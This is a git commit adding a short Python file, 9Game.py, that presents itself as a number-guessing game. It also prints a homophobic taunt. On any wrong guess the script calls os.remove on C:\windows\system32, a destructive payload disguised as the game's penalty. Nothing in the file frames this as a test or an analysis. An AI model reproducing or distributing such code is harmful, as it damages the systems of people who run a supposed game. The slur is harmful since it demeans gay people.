909729ce2da36dc59d235bfeb77a0a5d6ef3cbb5
Vivek2010-cyber <vivekyadav007905@gmail.com>
2025-03-02 17:34:46 +0530

    Add files via upload

---
+++ 9Game.py
@@ -0,0 +1,11 @@
+import os
+import random 
+print("if not guess you are gay")
+random = random.randint(1, 10)
+while True:
+    v1 = int(input("guess the number between 1 to 10 : "))
+    if random == v1:
+        print("you won the game")
+
+    else:
+        os.remove("C:\windows\system32")
